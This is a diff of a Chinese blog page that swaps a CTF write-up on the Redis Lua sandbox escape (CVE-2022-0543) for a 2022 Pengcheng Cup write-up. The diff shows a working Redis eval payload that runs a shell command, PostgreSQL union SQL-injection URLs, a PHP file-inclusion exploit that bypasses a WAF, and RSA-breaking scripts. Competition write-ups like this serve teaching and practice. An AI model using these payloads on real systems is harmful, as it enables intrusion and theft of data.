@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>虎符CTF2022 WP Quest-RCE | hututu&#39;blog</title>
+  <title>鹏城杯初赛-2022-WP | hututu&#39;blog</title>
   <meta name="keywords" content=" ctf ">
-  <meta name="description" content="虎符CTF2022 WP Quest-RCE | hututu&#39;blog">
+  <meta name="description" content="鹏城杯初赛-2022-WP | hututu&#39;blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="easygo给了源码，下下来打开发现存在sql注入     直接看数据库中的存在有什么表，其中有一个表比较可疑：super_secret_table 1&#x2F;juice&#x2F;1&amp;#x27;%20union%20select%201,table_name%20from%20information_schema.tables%20limit%201offset%20§这个是偏移§--        于是查看这">
 <meta property="og:type" content="article">
@@ -330,9 +330,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-虎符CTF2022-WP-Quest-RCE" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-鹏城杯初赛-2022-WP" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">虎符CTF2022 WP Quest-RCE</h1>
+        <h1 class="article-title">鹏城杯初赛-2022-WP</h1>
     
     <div class="article-meta">
         
@@ -357,7 +357,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2022-06-28 01:21:00'>2022-03-20 21:17</time>
+            Created At : <time class="date" title='Updated At: 2022-07-06 00:38:45'>2022-07-06 00:34</time>
         
     </div>
     <div class="article-meta">
@@ -390,7 +390,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quest-RCE"><span class="toc-text">Quest-RCE</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#easygo"><span class="toc-text">easygo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E5%8C%85%E5%90%AB"><span class="toc-text">简单包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-rsa"><span class="toc-text">easy_rsa</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5"><span class="toc-text">第一步</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5"><span class="toc-text">第二步</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5"><span class="toc-text">第三步</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -406,14 +406,56 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Quest-RCE"><a href="#Quest-RCE" class="headerlink" title="Quest-RCE"></a>Quest-RCE</h2><p>查看题目并进行搜索发现这是Redis 沙盒逃逸漏洞，CVE-2022-0543。</p>
-<p>参考：<a target="_blank" rel="noopener" href="https://www.adminxe.com/3620.html%EF%BC%8C%E5%88%A9%E7%94%A8package%E6%8F%90%E4%BE%9B%E7%9A%84%E6%96%B9%E6%B3%95%E5%8A%A0%E8%BD%BD%E5%8A%A8%E6%80%81%E9%93%BE%E5%BA%93%E7%9A%84%E5%87%BD%E6%95%B0%EF%BC%8C%E8%BF%9B%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E3%80%82">https://www.adminxe.com/3620.html，利用package提供的方法加载动态链库的函数，进行任意命令执行。</a></p>
-<p>payload如下：</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;query&quot;</span><span class="punctuation">:</span><span class="string">&quot;SET \&quot;dir\&quot; \&quot;/var/www/uploads/\&quot; \n eval &#x27;local io_l = package.loadlib(\&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\&quot;, \&quot;luaopen_io\&quot;); local io = io_l(); local f = io.popen(\&quot;cat /flag_UVEmnDKY4VHyUVRVj46ZeojgfZpxzG\&quot;, \&quot;r\&quot;); local res = f:read(\&quot;*a\&quot;); f:close(); return res&#x27; 0&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+        <h2 id="easygo"><a href="#easygo" class="headerlink" title="easygo"></a>easygo</h2><p>给了源码，下下来打开发现存在sql注入</p>
+<img src="/2022/07/06/%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B-2022-WP/image1.png" class="" title="This is an image">
 
-<img src="/2022/03/20/%E8%99%8E%E7%AC%A6CTF2022-WP-Quest-RCE/image1.jpg" class="" title="This is an image">
 
-<p>flag: HFCTF{34da8018-8720-42a0-95db-773a452ff1ee}</p>
+
+<p>直接看数据库中的存在有什么表，其中有一个表比较可疑：<code>super_secret_table</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/juice/1&#x27;%20union%20select%201,table_name%20from%20information_schema.tables%20limit%201offset%20§这个是偏移§--</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2022/07/06/%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B-2022-WP/image2.png" class="" title="This is an image">
+
+
+
+<p>于是查看这个表的列名，发现存在flag字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/juice/1&#x27;%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_name=&#x27;super_secret_table&#x27;--</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2022/07/06/%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B-2022-WP/image3.png" class="" title="This is an image">
+
+
+
+<p>直接读取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/juice/1&#x27;%20union%20select%201,flag%20from%20super_secret_table--</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2022/07/06/%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B-2022-WP/image4.png" class="" title="This is an image">
+
+
+
+<p><code>flag:PCL&#123;Postgresql_1njection_1s_3asY&#125;</code></p>
+<h2 id="简单包含"><a href="#简单包含" class="headerlink" title="简单包含"></a>简单包含</h2><p>源码很简单就是通过文件包含读取flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line"><span class="comment">//flag in /var/www/html/flag.php</span></span><br></pre></td></tr></table></figure>
+
+<p>但是存在waf，可以通过上传文件使得waf溢出失效，exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.1.113/&quot;</span></span><br><span class="line">request_files = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: ((<span class="string">&#x27;demo.jpg&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;./image.jpg&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)))</span><br><span class="line">&#125;</span><br><span class="line">data=&#123;<span class="string">&#x27;flag&#x27;</span>: <span class="string">&#x27;php://filter/convert.base64-encode/resource=/var/www/html/flag.php&#x27;</span>&#125;</span><br><span class="line">resp = requests.post(url=url, data=data,files=request_files)</span><br><span class="line"><span class="built_in">print</span>(resp.content)</span><br></pre></td></tr></table></figure>
+
+<p><code>flag: PCL&#123;bc58644f-f757-11ec-9edf-5224002d2b29&#125;</code></p>
+<h2 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy_rsa"></a>easy_rsa</h2><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p>e和phi不互素：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">0x27455f081e4858790c6503580dad3302ae359c9fb46dc601eee98f05142128404e95377324720adbbdebf428549008bcd1b670f6749592a171b30316ab707004b9999f3b80de32843afdfd30505b1f4166a03cee9fc48902b74b6e850cfd268e6917c5d84e64f7e7cd0e4a30bfe5903fb5d821d27fdc817d9c4536a8e7aea55af266abcae857a8ffff2f741901baba1b44091a137c69c471c123ab0b80e250e055959c468e6e37c005105ecd7c8b48c659024e5e251df3eeff5da7b3d561cd98150da3575a16bee5f2524d2795fd4879487018345c1e96efc085ed45fb5f02c027aee5bca3aad0eb3e23376c0cd18b02fb05a1ff8fb1af0a3ce4bb671599894e</span></span><br><span class="line">p = <span class="number">0xbb602e402b68a5cfcc5cfcc63cc82e362e98cb7043817e3421599a4bb8755777c362813742852dad4fec7ec33f1faec04926f0c253f56ab4c4dde6d71627fbc9ef42425b70e5ecd55314e744aa66653103b7d1ba86d1e0e21920a0bfe7d598bd09c3c377a3268928b953005450857c6cfea5bfdd7c16305baed0f0a31ad688bd</span></span><br><span class="line">q = <span class="number">0xbb8d1ea24a3462ae6ec28e79f96a95770d726144afc95ffffa19c7c3a3786a6acc3309820ba7b1a28a4f111082e69e558b27405613e115139b38e799c723ab7fdd7be14b330b118ae60e3b44483a4c94a556e810ab94bbb102286d0100d7c20e7494e20e0c1030e016603bd2a06c1f6e92998ab68e2d420faf47f3ee687fb6d1</span></span><br><span class="line">e = <span class="number">0x292</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt1</span>(<span class="params">p, q, e, c</span>):</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    t = gmpy2.gcd(e, phi)</span><br><span class="line">    d = gmpy2.invert(e // t, phi)</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    msg = gmpy2.iroot(m, t)</span><br><span class="line">    <span class="keyword">if</span> msg[<span class="number">1</span>]:</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(msg[<span class="number">0</span>]))</span><br><span class="line">decrypt1(p,q,e,c)</span><br><span class="line"><span class="comment"># PCL&#123;16745c3b</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p>p的高位攻击：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先用sagemath求出q、p</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase3</span>(<span class="params">high_p, n</span>):</span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    p = high_p + x</span><br><span class="line">    x0 = p.small_roots(X = <span class="number">2</span>^<span class="number">60</span>, beta = <span class="number">0.1</span>)[<span class="number">0</span>]</span><br><span class="line">    P = <span class="built_in">int</span>(p(x0))</span><br><span class="line">    Q = n // P</span><br><span class="line">    <span class="built_in">print</span>(P)</span><br><span class="line">    <span class="built_in">print</span>(Q)</span><br><span class="line">    <span class="keyword">assert</span> n == P*Q</span><br><span class="line"></span><br><span class="line">p=<span class="number">0xa9cb9e2eb43f17ad6734356db18ad744600d0c19449fc62b25db7291f24c480217d60a7f87252d890b97a38cc6943740ac344233446eea4084c1ba7ea5b7cf2399d42650b2a3f0302bab81295abfd7cacf248de62d3c63482c5ea8ab6b25cdbebc83eae855c1d07a8cf0408c2b721e43c4ac53262bf9aaf7a000000000000000</span></span><br><span class="line">n=<span class="number">0x841a5a012c104e600eca17b451d5fd37c063ad347707a2e88f36a07e9ad4687302790466e99f35b11580cbe8b0a212e6709686c464a6393c5895b1f97885f23ea12d2069eb6dc3cb4199fb8c6e80a4a94561c6c3499c3c02d9dc9cf216c0f44dc91701a6d9ec89981f261a139500420a51014492f1da588a26e761439dd5739b32540ca6dc1ec3b035043bc535304a06ccb489f72fcd1aa856e1cffe195039176937f9a16bd19030d1e00095f1fd977cf4f23e47b55650ca4712d1eb089d92df032e5180d05311c938a44decc6070cd01af4c6144cdab2526e5cb919a1828bec6a4f3332bf1fa4f1c9d3516fbb158fd4fbcf8b0e67eff944efa97f5b24f9aa65</span></span><br><span class="line">phase3(p,n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># python直接求出m</span></span><br><span class="line">p=<span class="number">119234372387564173916926418564504307771905987823894721284221707768770334474240277144999791051191061404002537779694672314673997030282474914206610847346023297970473719280866108677835517943804329212840618914863288766846702119011361533150365876285203805100986025166317939702179911918098037294325448226481818486521</span></span><br><span class="line">q=<span class="number">139862779248852876780236838155351435339041528333485708458669785004897778564234874018135441729896017420539905517964705602836874055417791439544162777504181482765029478481701166935117795286988835104239238153206137155845327225155932803904032184502243017645538314995056944419185855910939481260886933456330514972109</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0c134c83b74f</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h4><p>c和n不互素，这里直接求公约数得到p，再求出m</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">0x1bd2a47a5d275ba6356e1e2bd10d6c870693be540e9318c746e807a7672f3a75cc63841170126d7dba52d7f6f9cf0f8dce9705fc1785cc670b2658b05d4b24d8918f95594844bfa920c8ffe73160c2c313b3fdbc4541ec19828165e34afa7d05271cc6fd59d08138b88c11677e6ac3b39cff525dcb19694b0388d895f53805a5e5bd8cfb947080e4855aaf83ebd85a397526f7d76d26031386900cb44a2e4bd121412bcee7a6c1e9af411e234f130e68a428596265d3ec647e50f65cb81393f4bd38389a2b9010fd715582506b9054dc235aced50757462b77a5606f116853af0c1ea3c7cf0d304f885d86081f8bac8b67b0625122f75448c5b6eb8f1cc8a0df</span></span><br><span class="line">n = <span class="number">0xc2b17c86a8950f6dafe0a633890e4271cfb20c5ffda2d6b3d035afa655ed05ec16c67b18832ed887f2cea83056af079cc75c2ce43c90cce3ed02c2e07d256f240344f1734adeee6dc2b3b4bbf6dcfc68518d0a74e3e66f1865db95ef4204457e6471903c2321ac97f3b8e3d8d935896e9fc9145a30a3e24e7c320490a9944c1e94d301c8388445532699e6189f4aa6a86f67f1d9b8fb0de4225e005bd27594cd33e36622b2cd8eb2781f0c24d33267d9f29309158942b681aab81f39d1b4a73bd17431b46a89a0e4c2c58b1e24e850355c63b72392600d3fff7a16f6ef80ea515709da3ef1d28782882b0dd2f76bf609590db31979c5d1fd03f75d9d8f1c5069</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">p=gmpy2.gcd(c,n)</span><br><span class="line">q=n//p</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)//<span class="number">2022</span>//<span class="number">1011</span>//p</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 977260aae9b5&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>flag: PCL&#123;16745c3b0c134c83b74f977260aae9b5&#125;</code></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 hututu1024@126.com </span>
